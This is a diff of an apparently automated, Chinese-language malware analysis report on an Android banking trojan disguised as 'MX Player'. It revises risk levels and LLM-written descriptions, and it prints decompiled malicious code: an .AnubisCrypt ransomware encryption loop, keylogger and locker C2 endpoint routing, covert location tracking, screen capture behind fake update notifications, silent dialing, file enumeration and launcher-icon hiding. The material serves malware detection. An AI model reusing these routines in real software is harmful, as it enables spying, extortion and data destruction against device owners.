@@ -6,7 +6,7 @@
     "应用名": "MX Player",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 260.3
+    "分析耗时(秒)": 350.3
   },
   "行为列表": [
     {
@@ -29,10 +29,10 @@
           "method_signature": "onStartCommand(Intent intent, int i, int i2)",
           "malicious_behavior": "location_tracking",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "this.a = (LocationManager) getSystemService(\"location\");\nthis.a.requestLocationUpdates(\"network\", 15000L, 10.0f, this.d);",
           "malicious_code_snippet_context": "      public int onStartCommand(Intent intent, int i, int i2) {\n          try {\n              checkCallingOrSelfPermission(\"android.permission.ACCESS_FINE_LOCATION\");\n>>>             this.a = (LocationManager) getSystemService(\"location\");\n>>>             this.a.requestLocationUpdates(\"network\", 15000L, 10.0f, this.d);\n          } catch (Exception unused) {\n          }\n          return i;",
-          "behavior_description": "在后台Service的onStartCommand中，通过LocationManager以network方式（基站/Wi-Fi定位）每15秒、最小移动10米为间隔持续请求位置更新，位置数据回调至LocationListener(this.d)进行收集。该行为在恶意样本中属于隐蔽的位置追踪，用户无感知，收集的位置数据可能被进一步上传至C2服务器。",
+          "behavior_description": "该代码位于混淆类名的后台 Service 的 onStartCommand 中，通过 LocationManager 以网络定位（基站/WiFi，无需GPS硬件且更隐蔽）方式注册位置更新监听，每 15 秒或每移动 10 米触发一次回调，持续 covert 采集用户实时地理位置。数据流向：网络定位提供者（LocationManager）→ requestLocationUpdates 注册的 LocationListener 回调（this.d）→ 后续疑似被窃取上传。注意 checkCallingOrSelfPermission 的返回值未被检查，仅作伪装，且整个请求包裹在 try-catch 中静默吞掉异常，属于典型的隐蔽位置追踪/隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -56,9 +56,9 @@
           "malicious_behavior": "keylogging",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (str.equals(\"12\")) { str3 = \"/private/datakeylogger.php\"; }",
-          "malicious_code_snippet_context": "if (str.equals(\"12\")) { str3 = \"/private/datakeylogger.php\"; }",
-          "behavior_description": "代码根据命令编号路由到不同的C2服务器端点。当str为\"12\"时，将路径设置为/datakeylogger.php，该端点用于接收并上传键盘记录器捕获的用户输入数据。结合同组端点(locker.php勒索、spam.php垃圾短信、add_inj.php注入)可确认这是银行木马的多功能C2通信模块，键盘记录数据将被发送至远程服务器。",
+          "malicious_code_snippet": "if (str.equals(\"12\")) {\n    str3 = \"/private/datakeylogger.php\";\n}",
+          "malicious_code_snippet_context": "          if (str.equals(\"11\")) {\n              str3 = \"/private/locker.php\";\n          }\n>>>         if (str.equals(\"12\")) {\n>>>             str3 = \"/private/datakeylogger.php\";\n>>>         }\n          if (str.equals(\"13\")) {\n              str3 = \"/private/sound.php\";\n          }",
+          "behavior_description": "该代码是远程控制木马(RAT)的指令分发逻辑，根据C2服务器下发的指令编号(str)选择对应的PHP接口路径。当指令为\"12\"时，将数据上传路径设置为/private/datakeylogger.php，即用于将木马在受害设备上捕获的键盘记录数据上传至远程C2服务器。同级的其他指令还揭示了该木马具备界面注入(add_inj.php)、设备锁定勒索(locker.php)、录音窃听(sound.php)、垃圾短信(spam.php)等多种恶意功能。数据流向：键盘输入捕获(按键记录数据)→ 通过HTTP请求上传至C2服务器的datakeylogger.php接口，直接导致用户账号密码、银行卡信息、聊天内容等敏感隐私泄露。",
           "glm_analyzed": true
         }
       ]
@@ -89,9 +89,9 @@
           "malicious_behavior": "ransomware",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "if (this.b.equals(\"crypt\")) { if (!file2.getPath().contains(\".AnubisCrypt\")) { byte[] a2 = this.a.a(a, this.c); fileOutputStream = new FileOutputStream(file2.getPath() + \".AnubisCrypt\", true); fileOutputStream.write(a2); } } else if (this.b.equals(\"decrypt\") && file2.getPath().contains(\".AnubisCrypt\")) { byte[] b = this.a.b(a, this.c); fileOutputStream = new FileOutputStream(file2.getPath().replace(\".AnubisCrypt\", \"\"), true); fileOutputStream.write(b); } fileOutputStream.close(); file2.delete();",
-          "malicious_code_snippet_context": "if (this.b.equals(\"crypt\")) { if (!file2.getPath().contains(\".AnubisCrypt\")) { byte[] a2 = this.a.a(a, this.c); fileOutputStream = new FileOutputStream(file2.getPath() + \".AnubisCrypt\", true); fileOutputStream.write(a2); } } else if (this.b.equals(\"decrypt\") && file2.getPath().contains(\".AnubisCrypt\")) { byte[] b = this.a.b(a, this.c); fileOutputStream = new FileOutputStream(file2.getPath().replace(\".AnubisCrypt\", \"\"), true); fileOutputStream.write(b); } fileOutputStream.close(); file2.delete();",
-          "behavior_description": "该代码是勒索软件文件加密逻辑。遍历用户文件(file2)后，读取文件内容(c.a(file2))，当操作模式为'crypt'时，使用加密算法对文件数据进行加密(this.a.a(a, this.c))，将加密后的数据写入添加了'.AnubisCrypt'扩展名的新文件中，随后删除原始文件(file2.delete())，导致用户文件被加密锁定。同时代码也包含'decrypt'解密分支，表明攻击者持有解密密钥，以此勒索用户。",
+          "malicious_code_snippet": "byte[] bArrA = c.a(file2);\nif (this.b.equals(\"crypt\")) {\n    if (!file2.getPath().contains(\".AnubisCrypt\")) {\n        byte[] bArrA2 = this.a.a(bArrA, this.c);\n        fileOutputStream = new FileOutputStream(file2.getPath() + \".AnubisCrypt\", true);\n        fileOutputStream.write(bArrA2);\n        fileOutputStream.close();\n        file2.delete();\n    }\n} else if (this.b.equals(\"decrypt\") && file2.getPath().contains(\".AnubisCrypt\")) {\n    byte[] bArrB = this.a.b(bArrA, this.c);\n    fileOutputStream = new FileOutputStream(file2.getPath().replace(\".AnubisCrypt\", \"\"), true);\n    fileOutputStream.write(bArrB);\n    fileOutputStream.close();\n    file2.delete();\n}",
+          "malicious_code_snippet_context": "                  } else if (file2.isFile()) {\n                      try {\n                          c cVar = this.a;\n>>>                         byte[] bArrA = c.a(file2);\n>>>                         if (this.b.equals(\"crypt\")) {\n>>>                             if (!file2.getPath().contains(\".AnubisCrypt\")) {\n>>>                                 byte[] bArrA2 = this.a.a(bArrA, this.c);\n>>>                                 fileOutputStream = new FileOutputStream(file2.getPath() + \".AnubisCrypt\", true);\n>>>                                 fileOutputStream.write(bArrA2);\n>>>                                 fileOutputStream.close();\n>>>                                 file2.delete();\n>>>                             }\n>>>                         } else if (this.b.equals(\"decrypt\") && file2.getPath().contains(\".AnubisCrypt\")) {\n>>>                             byte[] bArrB = this.a.b(bArrA, this.c);\n>>>                             fileOutputStream = new FileOutputStream(file2.getPath().replace(\".AnubisCrypt\", \"\"), true);\n>>>                             fileOutputStream.write(bArrB);\n>>>                             fileOutputStream.close();\n>>>                             file2.delete();\n>>>                         }\n                      } catch (Exception unused) {\n                      }\n                  }",
+          "behavior_description": "这是典型的勒索软件文件加密行为（Anubis 勒索家族特征）。代码遍历设备存储中的文件，读取文件内容（c.a(file2)）作为数据来源，当控制参数为 \"crypt\" 时，使用密钥 this.c 对文件字节流进行加密（this.a.a(bArrA, this.c)），将加密后的数据写入添加 \".AnubisCrypt\" 后缀的新文件，随后删除原始文件（file2.delete()），导致用户文件被加密劫持无法正常访问。同时代码保留 \"decrypt\" 分支，可用相同密钥解密并恢复文件，表明这是完整的勒索加密/解密引擎，通常配合勒索提示向用户索要赎金或密钥。数据流向：读取用户文件内容 → 加密 → 写入加密文件并删除原文件，直接造成用户数据损失。",
           "glm_analyzed": true
         }
       ]
@@ -124,7 +124,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "private void a() {\n    this.e = new Notification.Builder(this.d).setContentTitle(\"Info\").setContentText(\"Update The Driver System..\").setSmallIcon(R.drawable.im).build();\n    startForeground(9906, this.e);\n}",
           "malicious_code_snippet_context": "      }\n  \n      @TargetApi(16)\n>>>     private void a() {\n>>>         this.e = new Notification.Builder(this.d).setContentTitle(\"Info\").setContentText(\"Update The Driver System..\").setSmallIcon(R.drawable.im).build();\n>>>         startForeground(9906, this.e);\n>>>     }\n  \n      private void b() {\n          new Thread(new Runnable() { // from class: ivo.baxkjggmgror.itiukv.ipu.1",
-          "behavior_description": "代码创建了一个伪装为系统更新（'Update The Driver System..'）的通知，并调用startForeground()将服务提升为前台服务，从而提高进程优先级，防止被系统杀死，实现保活目的。",
+          "behavior_description": "该代码通过 startForeground(9906, notification) 将服务提升为前台服务实现进程保活。通知标题为'Info'、内容伪装成系统驱动更新提示（'Update The Driver System..'），利用欺骗性通知降低系统查杀概率并使用户难以察觉后台服务的持续驻留，为恶意样本提供持久化运行环境，配合 b() 方法中启动的后台线程持续执行任务。数据流向：硬编码的伪装通知文本→Notification.Builder 构造→startForeground() 前台服务保活。",
           "glm_analyzed": true
         }
       ]
@@ -148,9 +148,9 @@
           "malicious_behavior": "screen_capture",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "this.c = this.g.getMediaProjection(this.j, this.k);\nthis.d = this.c.createVirtualDisplay(\"andshooter\", this.i.b(), this.i.c(), getResources().getDisplayMetrics().densityDpi, 9, this.i.a(), null, this.f);\nthis.m = new Notification.Builder(this.l).setContentTitle(\"Info\").setContentText(\"Update Google Play\").setSmallIcon(R.drawable.im).build();\nstartForeground(9906, this.m);",
-          "malicious_code_snippet_context": "      @TargetApi(21)\n      public void c() {\n          try {\n>>>             this.c = this.g.getMediaProjection(this.j, this.k);\n>>>             this.i = new a(this);\n>>>             MediaProjection.Callback callback = new MediaProjection.Callback() { // from class: ivo.baxkjggmgror.itiukv.API.Screenshot.rxyuawkyfg.3\n>>>                 @Override // android.media.projection.MediaProjection.Callback\n                  public void onStop() {\n                      rxyuawkyfg.this.d.release();\n                  }",
-          "behavior_description": "该代码通过 MediaProjection 获取屏幕投影权限，调用 createVirtualDisplay 创建名为 'andshooter' 的虚拟显示器，将屏幕内容持续捕获到 Surface 上实现屏幕截图/录屏功能。同时通过 startForeground 启动前台服务，并伪装通知标题为 'Update Google Play' 以欺骗用户，掩盖后台正在进行的屏幕录制行为。在恶意样本中，此行为通常用于窃取用户屏幕上的敏感信息（如银行凭证、密码、聊天内容等）。",
+          "malicious_code_snippet": "this.c = this.g.getMediaProjection(this.j, this.k);\nthis.d = this.c.createVirtualDisplay(\"andshooter\", this.i.b(), this.i.c(), getResources().getDisplayMetrics().densityDpi, 9, this.i.a(), null, this.f);\nthis.c.registerCallback(callback, this.f);\nthis.m = new Notification.Builder(this.l).setContentTitle(\"Info\").setContentText(\"Update Google Play\").setSmallIcon(R.drawable.im).build();\nstartForeground(9906, this.m);",
+          "malicious_code_snippet_context": "      @TargetApi(21)\n      public void c() {\n          try {\n>>>             this.c = this.g.getMediaProjection(this.j, this.k);\n>>>             this.i = new a(this);\n>>>             MediaProjection.Callback callback = new MediaProjection.Callback() { // from class: ivo.baxkjggmgror.itiukv.API.Screenshot.rxyuawkyfg.3\n>>>                 @Override // android.media.projection.MediaProjection.Callback\n>>>                 public void onStop() {\n                      rxyuawkyfg.this.d.release();\n                  }\n              };",
+          "behavior_description": "该代码位于混淆包名的 API.Screenshot 模块中，通过 MediaProjection API 创建名为 'andshooter' 的虚拟显示屏，将设备屏幕实时内容渲染到 Surface 上实现屏幕截图/录屏。同时通过 startForeground 启动前台服务保活，并用伪装成 'Update Google Play' 更新的欺骗性通知隐藏真实行为，使用户无感知地持续截取屏幕。数据流向：设备屏幕内容→MediaProjection.createVirtualDisplay() 捕获到 Surface→生成截图数据（后续可被窃取上传至C2），屏幕上显示的密码、短信验证码、银行信息等敏感内容均可被捕获，属于典型的间谍监控隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -185,7 +185,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\");\nintent.addFlags(268435456);\nintent.setData(Uri.fromParts(\"tel\", str, \"#\"));\ncontext.startActivity(intent);",
           "malicious_code_snippet_context": "  \n      public void a(Context context, String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\");\n>>>             intent.addFlags(268435456);\n>>>             intent.setData(Uri.fromParts(\"tel\", str, \"#\"));\n>>>             context.startActivity(intent);\n          } catch (Exception unused) {\n              a(\"callForward\", \"ERROR\");\n          }",
-          "behavior_description": "代码使用 Intent ACTION_CALL 直接发起电话呼叫，无需用户交互。结合异常处理中的 \"callForward\" 提示及号码末尾的 \"#\" 符号，推测该代码可能用于静默拨打特定号码或执行 USSD 呼叫转移指令，可能导致用户产生高额通话费用或被恶意呼叫转移。",
+          "behavior_description": "该代码使用 ACTION_CALL Intent 直接发起电话呼叫（区别于 ACTION_DIAL 仅调起拨号界面），通过 Uri.fromParts(\"tel\", str, \"#\") 构造目标号码并调用 startActivity() 静默拨号，全程无需用户确认。电话号码 str 由外部传入（结合同类中的字符串截取方法 substring(indexOf(marker)) 的解析逻辑，推测号码来自 C2 服务器指令或短信指令解析），异常处理中上报 \"callForward\" 错误表明该功能与恶意呼叫转移/自动拨号指令链路相关。数据流向：远程指令/短信内容（source）→ 字符串解析提取号码 → ACTION_CALL + startActivity() 静默拨号（sink）。混淆的类路径（ivo.baxkjggmgror.itiukv.c）进一步印证恶意性质。静默拨打高额费率号码可造成用户直接经济损失，属于典型的拨号欺诈行为。",
           "glm_analyzed": true
         }
       ]
@@ -212,10 +212,10 @@
           "method_signature": "for(File file2 : file.listFiles()",
           "malicious_behavior": "file_access",
           "behavior_type": "malicious",
-          "risk_level": "中",
-          "malicious_code_snippet": "for (File file2 : file.listFiles()) {\n    if (file2.isDirectory()) {\n        str = str + file2.getName() + \"|\";\n    } else {\n        str2 = str2 + file2.getName() + \"|\";\n    }\n}",
-          "malicious_code_snippet_context": "          String str = \"\";\n          String str2 = \"\";\n          try {\n>>>             for (File file2 : file.listFiles()) {\n>>>                 if (file2.isDirectory()) {\n>>>                     a(\"Folder\", \"\" + file2.getName());\n>>>                     str = str + file2.getName() + \"|\";\n>>>                 } else {\n>>>                     a(\"File\", \"\" + file2.getName());\n>>>                     str2 = str2 + file2.getName() + \"|\";\n                  }\n              }\n          } catch (Exception unused) {",
-          "behavior_description": "该方法遍历指定目录下的所有文件和子目录，将文件名和文件夹名分别用'|'拼接成字符串。在恶意样本上下文中，这是文件窃取或勒索软件的典型前置步骤——先枚举文件目录结构，后续可能将文件列表上传至C2服务器或对文件进行加密/窃取操作。数据流向为：file.listFiles()枚举文件系统 → 拼接文件名列表收集目录结构信息。",
+          "risk_level": "高",
+          "malicious_code_snippet": "for (File file2 : file.listFiles()) {\n    if (file2.isDirectory()) {\n        a(\"Folder\", \"\" + file2.getName());\n        str = str + file2.getName() + \"|\";\n    } else {\n        a(\"File\", \"\" + file2.getName());\n        str2 = str2 + file2.getName() + \"|\";\n    }\n}",
+          "malicious_code_snippet_context": "          String str = \"\";\n          String str2 = \"\";\n          try {\n>>>             for (File file2 : file.listFiles()) {\n>>>                 if (file2.isDirectory()) {\n>>>                     a(\"Folder\", \"\" + file2.getName());\n>>>                     str = str + file2.getName() + \"|\";\n>>>                 } else {\n>>>                     a(\"File\", \"\" + file2.getName());\n>>>                     str2 = str2 + file2.getName() + \"|\";\n>>>                 }\n>>>             }\n          } catch (Exception unused) {\n              a(\"ERROR\", \"listFilesWithSubFolders\");\n          }",
+          "behavior_description": "该方法（错误日志显示为 listFilesWithSubFolders）遍历指定目录，枚举设备存储中的全部文件与子目录名称，将目录名和文件名分别拼接为以'|'分隔的字符串，并逐条通过 a() 方法上报，最终返回聚合清单。结合同类中存在的 HTTP POST 上传逻辑（catch 块中的 'POST -> URL'），完整的文件目录结构会被发送至远程服务器。数据流向：本地文件系统→目录枚举→文件名清单聚合→上报/返回给调用方经 POST 外传至 C2。这是文件窃取行为的前置侦察步骤，攻击者据此掌握受害者文件结构后可选择性窃取文件内容，且类名/包名高度混淆（baxkjggmgror、rgibvym 等），符合恶意样本刻意隐藏意图的特征。",
           "glm_analyzed": true
         }
       ]
@@ -238,10 +238,10 @@
           "method_signature": "if(!this.b.n || Build.VERSION.SDK_INT < 19)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(this, lbdeyt.class), 2, 1);",
           "malicious_code_snippet_context": "              webView.loadUrl(this.b.o);\n              setContentView(webView);\n          }\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(this, (Class<?>) lbdeyt.class), 2, 1);\n          try {\n              c cVar = this.a;\n              c.a(this, \"startAlarm\", Integer.parseInt(this.a.d(this, \"Interval\")));",
-          "behavior_description": "应用启动后，通过 PackageManager 将自身的主 Activity 组件状态设置为 DISABLED (参数2)，从而在桌面隐藏应用图标，使用户难以察觉和卸载，随后设置定时任务在后台持续运行。",
+          "behavior_description": "在主 Activity（lbdeyt）的 onCreate 中，应用通过 PackageManager.setComponentEnabledSetting 将自身启动器组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数值2，配合 DONT_KILL_APP=1），使应用图标从桌面启动器中消失，用户无法察觉和直接卸载。数据流向：应用自身组件名 ComponentName(this, lbdeyt.class) → setComponentEnabledSetting() 禁用组件。此外该代码还启动后台服务并注册 10 秒间隔的定时闹钟实现保活驻留，图标隐藏与持久化机制结合，属于典型的恶意软件隐蔽驻留行为。",
           "glm_analyzed": true
         }
       ]
@@ -254,7 +254,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
